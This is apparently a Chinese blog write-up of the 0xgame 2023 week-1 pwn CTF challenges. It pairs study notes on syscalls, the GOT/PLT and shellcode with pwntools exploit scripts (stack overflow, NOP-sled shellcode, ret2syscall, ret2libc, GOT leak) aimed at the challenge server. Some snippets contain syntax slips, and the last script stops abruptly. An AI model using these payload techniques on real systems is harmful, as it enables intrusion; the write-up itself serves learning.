<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【2023 week1】0xgame-CTF - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【2023 week1】0xgame-CTF" />
<meta property="og:description" content="文章目录 找不到且不对劲的flag永远进不去的后门随便乱搞的shellcode⾼端的syscall我后门呢got-it字符串和随机数 找不到且不对劲的flag ls -a 显示隐藏文件 cd .secret cat flag 即可 永远进不去的后门 read函数之前的关于参数的汇编得出buf与rbp相差0x40
from pwn import* context(os=&#34;linux&#34;,arch=&#34;amd64&#34;,log_level=&#34;debug&#34;) file=remote(&#34;8.130.35.16&#34;,51002) print(p64(0x401298)) payload=b&#34;a&#34;*0x48&#43;p64(0x401298) file.send(payload) file.interactive() 随便乱搞的shellcode mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享
time（）当参数为NULL时，返回值是从1970年1月1日至今所经历的时间（以秒为单位）
rand()需要一个“种子”来进行生成伪随机数。而如果我们仅仅调用rand()函数，而没有设置随机数种子，rand()函数在调用时，自动设计随机数种子为1。随机种子相同，每次产生的随机数也会相同。解决办法就是使用srand()函数产生随机种子
如果在程序中定义了一个函数，那么在编译时系统就会为这个函数代码分配一段存储空间，这段存储空间的首地址称为这个函数的地址。而且函数名表示的就是这个地址。既然是地址我们就可以定义一个指针变量来存放，这个指针变量就叫作函数指针变量，简称函数指针。
函数返回值类型 (* 指针变量名) (函数参数列表);
void(*)(void) --表示一个返回值为void，没有参数的函数指针 (void(*)(void))--表示将函数强转成返回值为void，没有参数的函数的类型转换 在Linux中一切皆文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。
标准输入输出的指向是默认的，默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端。我们可以修改它们的指向，也即重定位
close（1）关闭了标准输出
沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。
换行符对应十六进制ascll码 0x0a
从0x20230000写入
bufa（）的函数地址为0x20230000~0x20230000&#43;255 即0x20230100（但不包括该地址）
NOP指令即“空指令”。执行到NOP指令时，CPU什么也不做，仅仅当做一个指令执行过去并继续执行NOP（地址增加的方向）后面的一条指令
内存中的十六进制90为nop指令
shellcraft.sh() 生成的是shell的汇编代码
asm(shellcraft.sh() ) 生成的是shell的二进制码（在内存中存放和该码一样）
b&#34;90&#34;在内存中存放是90的十六级进制ascll码
b&#34;\x90&#34;在内存中存放就是90（十六进制形式）
from pwn import* context(os=&#34;linux&#34;,arch=&#34;amd64&#34;,log_level=&#34;debug&#34;) file=remote(&#34;8.130.35.16&#34;,51003) payload=asm(shellcraft.sh()).rjust(0x100,b&#34;\x90&#34;) file.sendlineafter(&#34;code:&#34;,payload) file.interactive() ⾼端的syscall 首先可以发现一个alarm函数，修改其参数，不然影响调试
syscall和int 80都是系统调用
ROPgadget --binary 文件名 --only “pop|ret” | grep rdi" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/0e808bce8d8743f46a9f904745c9f80e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-30T11:35:06+08:00" />
<meta property="article:modified_time" content="2023-10-30T11:35:06+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【2023 week1】0xgame-CTF</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#flag_1" rel="nofollow">找不到且不对劲的flag</a></li><li><a href="#_7" rel="nofollow">永远进不去的后门</a></li><li><a href="#shellcode_19" rel="nofollow">随便乱搞的shellcode</a></li><li><a href="#syscall_67" rel="nofollow">⾼端的syscall</a></li><li><a href="#_160" rel="nofollow">我后门呢</a></li><li><a href="#gotit_226" rel="nofollow">got-it</a></li><li><a href="#_281" rel="nofollow">字符串和随机数</a></li></ul> 
</div> 
<p></p> 
<h2><a id="flag_1"></a>找不到且不对劲的flag</h2> 
<pre><code class="prism language-bash"><span class="token function">ls</span> <span class="token parameter variable">-a</span> 显示隐藏文件
<span class="token builtin class-name">cd</span> .secret 
<span class="token function">cat</span> flag  即可
</code></pre> 
<h2><a id="_7"></a>永远进不去的后门</h2> 
<p>read函数之前的关于参数的汇编得出buf与rbp相差0x40</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"8.130.35.16"</span><span class="token punctuation">,</span><span class="token number">51002</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x401298</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401298</span><span class="token punctuation">)</span>

<span class="token builtin">file</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h2><a id="shellcode_19"></a>随便乱搞的shellcode</h2> 
<p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享</p> 
<p>time（）当参数为NULL时，返回值是从1970年1月1日至今所经历的时间（以秒为单位）</p> 
<p>rand()需要一个“种子”来进行生成伪随机数。而如果我们仅仅调用rand()函数，而没有设置随机数种子，rand()函数在调用时，自动设计随机数种子为1。随机种子相同，每次产生的随机数也会相同。解决办法就是使用srand()函数产生随机种子</p> 
<p>如果在程序中定义了一个函数，那么在编译时系统就会为这个函数代码分配一段存储空间，这段存储空间的首地址称为这个函数的地址。而且函数名表示的就是这个地址。既然是地址我们就可以定义一个指针变量来存放，这个指针变量就叫作函数指针变量，简称函数指针。</p> 
<p>函数返回值类型 (* 指针变量名) (函数参数列表);</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>  <span class="token operator">--</span>表示一个返回值为<span class="token keyword">void</span>，没有参数的函数指针
<span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span>表示将函数强转成返回值为<span class="token keyword">void</span>，没有参数的函数的类型转换
</code></pre> 
<blockquote> 
 <p>在Linux中一切皆文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。<br> 标准输入输出的指向是默认的，默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端。我们可以修改它们的指向，也即重定位</p> 
</blockquote> 
<p>close（1）关闭了标准输出</p> 
<blockquote> 
 <p>沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。</p> 
</blockquote> 
<p>换行符对应十六进制ascll码 0x0a<br> 从0x20230000写入<br> bufa（）的函数地址为0x20230000~0x20230000+255 即0x20230100（但不包括该地址）</p> 
<p>NOP指令即“空指令”。执行到NOP指令时，CPU什么也不做，仅仅当做一个指令执行过去并继续执行NOP（地址增加的方向）后面的一条指令<br> 内存中的十六进制90为nop指令</p> 
<p><img src="https://images2.imgbox.com/c5/16/Ksy7URpY_o.png" alt="在这里插入图片描述"><br> shellcraft.sh() 生成的是shell的汇编代码<br> asm(shellcraft.sh() ) 生成的是shell的二进制码（在内存中存放和该码一样）<br> b"90"在内存中存放是90的十六级进制ascll码<br> b"\x90"在内存中存放就是90（十六进制形式）</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"8.130.35.16"</span><span class="token punctuation">,</span><span class="token number">51003</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b"\x90"</span><span class="token punctuation">)</span>  
<span class="token builtin">file</span><span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"code:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/09/72/mwCjPMkE_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="syscall_67"></a>⾼端的syscall</h2> 
<p>首先可以发现一个alarm函数，修改其参数，不然影响调试</p> 
<p>syscall和int 80都是系统调用</p> 
<p>ROPgadget --binary 文件名 --only “pop|ret” | grep rdi<br> ROPgadget --binary 文件名 --sting ‘/bin/sh’</p> 
<p>Test命令将两个操作数进行逻辑与运算</p> 
<p>传统Int 0x80系统调用</p> 
<p>exceve调用号 64位为59 32位为11</p> 
<p>flat函数可以将多个变量转换为二进制字符串，这是一种官方的write up<br> <img src="https://images2.imgbox.com/26/42/ANT2opAh_o.png" alt="在这里插入图片描述"></p> 
<p>下面可以理解为一个shellcode，理解一下系统调用shell需要的参数</p> 
<pre><code class="prism language-bash">      push rax
      
      xor rdx, rdx

      xor rsi, rsi

      mov rbx,<span class="token string">'/bin//sh'</span>

      push rbx

      push rsp

      pop rdi

      mov al, <span class="token number">59</span>

      syscall
</code></pre> 
<p>系统调用号：EAX</p> 
<p>参数：EBX、ECX、EDX、ESI、EDI、EBP</p> 
<p>返回值：EAX</p> 
<p>具体功能号在 unistd_32.h 文件中</p> 
<p>64位系统调用syscall</p> 
<p>系统调用号：RAX</p> 
<p>参数：RDI、RSI、RDX、R10、R8、R9</p> 
<p>返回值：RAX</p> 
<p>具体功能号在 unistd_64.h 文件中</p> 
<p>在pwn中一般是使用 sys_execve 系统调用来获取shell的。</p> 
<p>这个endbr64指令在旧版本的cpu中会被当作NOP指令，而在新的cpu中其实也是个空操作指令，但是会被当作一个标志，用于监控间接跳转，他会出现在函数的开头位置。</p> 
<p>具体来说，就是当发生间接跳转时，cpu会从IDLE状态转换为WAITING状态，在WAITING状态的cpu运行的下一条指令必须为endbr64，如果不是的话，那么直接抛出一个异常，是的话CPU就转为IDLE状态继续执行。</p> 
<p>SIGBUS时总是因为地址未对齐导致的，而SIGSEGV则是由于内存地址不合法造成的</p> 
<p><img src="https://images2.imgbox.com/17/78/yvgDBB4i_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
<span class="token comment">#file=remote("8.130.35.16",51004)</span>
s<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"/home/llk/桌面/exp/ret2syscall(1)/dist/ret2syscall"</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/home/llk/桌面/exp/ret2syscall(1)/dist/ret2syscall"</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token string">"b*main"</span><span class="token punctuation">)</span> <span class="token operator">//</span>这玩意最好放前面这些东西的后边，不然脑子容易起火

rdi<span class="token operator">=</span><span class="token number">0x00000000004012e3</span>
rsi_r15<span class="token operator">=</span><span class="token number">0x00000000004012e1</span>
csu1<span class="token operator">=</span><span class="token number">0x4012DA</span>
csu2<span class="token operator">=</span><span class="token number">0x4012C0</span>
rax<span class="token operator">=</span><span class="token number">0x401196</span>
syscall<span class="token operator">=</span><span class="token number">0x4011AE</span>

<span class="token comment">#pause()</span>
payload<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00000000004012e3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">.</span>gets<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00000000004012e3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401196</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4012DA</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404508</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4012C0</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Input: \n"</span><span class="token punctuation">,</span>payload <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h2><a id="_160"></a>我后门呢</h2> 
<p>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符<br> 可以利用这一特性进行绕过如在零截断符后加上payload，从而使strlen结果为0进行绕过</p> 
<p>当文件执行时,会将libc.so中的文件一起合成一个新文件然后放入内存运行，此时内存除了原来的文件，还有libc.so的文件</p> 
<p>plt.[]和got.[]都是用于外部函数的,即程序中要使用到的外部函数<br> sym.[]可以用于自己构造的函数或者程序代码中要使用的外部函数（为外部函数时等于plt.[]的相对应的值）<br> 当第一次调用完某函数后，got表中才有相应的函数地址</p> 
<pre><code class="prism language-python">a<span class="token operator">=</span><span class="token string">'python'</span>
b<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">#nohtyp </span>
c<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment">#nhy</span>
<span class="token comment">#从后往前数的话，最后一个位置为-1</span>
d<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment">#从位置0到位置-1之前的数</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>  <span class="token comment">#pytho</span>
e<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment">#从位置0到位置-2之前的数</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>  <span class="token comment">#pyth</span>
</code></pre> 
<p>python十六进制和十进制转换</p> 
<pre><code class="prism language-python">
<span class="token number">10</span>转<span class="token number">16</span>
<span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token number">16</span>转<span class="token number">10</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>one_gadget就来专职去查找动态链接库里execve地址的</p> 
<p><img src="https://images2.imgbox.com/b8/64/hF8CtcTJ_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-c">
<span class="token keyword">int</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> command<span class="token punctuation">)</span>  <span class="token comment">//参数为地址</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"8.130.35.16"</span><span class="token punctuation">,</span><span class="token number">51005</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"../dist/ret2libc"</span><span class="token punctuation">)</span>    <span class="token operator">//</span>不能用elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"../dist/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token operator">//</span>不能用libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span> 
<span class="token operator">//</span>路径尽量填绝对路径，不知道为啥相对路径不行


payload<span class="token operator">=</span><span class="token string">b"\x00"</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401333</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"input:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
a<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>



puts_addr<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0xe3afe</span>
system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0xe3afe</span>



payload<span class="token operator">=</span><span class="token string">b"\x00"</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000000000040132c</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"input:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h2><a id="gotit_226"></a>got-it</h2> 
<p>利用got表 data段 bss段相邻的特性和对数组没有检查下界限的特性</p> 
<blockquote> 
 <p>Python3.1 开始引入了一个引入了一个新的整数类方法 int.to_bytes()。它是上一篇文章中讨论的 int.from_bytes() 反向转换方法。</p> 
 <blockquote> 
  <blockquote> 
   <p>(258).to_bytes(2, byteorder=“little”)<br> b’\x02\x01’<br> (258).to_bytes(2, byteorder=“big”)<br> b’\x01\x02’<br> (258).to_bytes(4, byteorder=“little”, signed=True)<br> b’\x02\x01\x00\x00’<br> (-258).to_bytes(4, byteorder=“little”, signed=True)<br> b’\xfe\xfe\xff\xff’<br> 第一个参数是转换后的字节数据长度，第二个参数 byteorder 将字节顺序定义为 little 或 big-endian，可选参数 signed 确定是否使用二进制补码来表示整数。</p> 
  </blockquote> 
 </blockquote> 
</blockquote> 
<p>输出bytes时候，它是采取这样的原则的：每读一个字节就和ascii码比对一下，如果符合ascii码的可显示字符（特殊字符，字母和数字，控制字符除外），那这个字节就按照ascii码来表示，否则就按十六进制\x某某来表示。<br> 所以bytes对象不能包含超过0到127内ascii码范围的unicode字符串，而不能接受超过这个范围的unicode字符串<br> b’字符串’表示bytes对象，这时候相当于一个接受0到127内ascii码范围内的unicode码字符串的函数bytes（‘字符串’）<br> \x加两位十六进制数字表示一个字节<br> encode转化为bytes，bytes可以通过decode转化为字符串</p> 
<p>这就是说明，tytes类型显示格式是十六进制格式，ASCII码原样不改变，但最终存储的值还是对应十六进制值格式对等的二进制格式值。</p> 
<p>始终记住：显示的是十六进制格式，存储的是对应的码值。如:</p> 
<blockquote> 
 <blockquote> 
  <blockquote> 
   <p>b’a’[0]<br> 97</p> 
  </blockquote> 
 </blockquote> 
</blockquote> 
<p>显示的是字符a，实际上保存的是对应的ASCII码值97</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
<span class="token comment">#s=process("./got-it")</span>
s<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"8.130.35.16"</span><span class="token punctuation">,</span><span class="token number">51006</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"../dist/libc.so.6"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">:</span>
 s<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt;&gt; "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
 menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"id: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name: "</span><span class="token punctuation">)</span>
 <span class="token keyword">return</span> s<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
 menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"id: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
dat<span class="token operator">=</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">)</span>
info<span class="token punctuation">(</span>dat<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>dat<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>puts
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
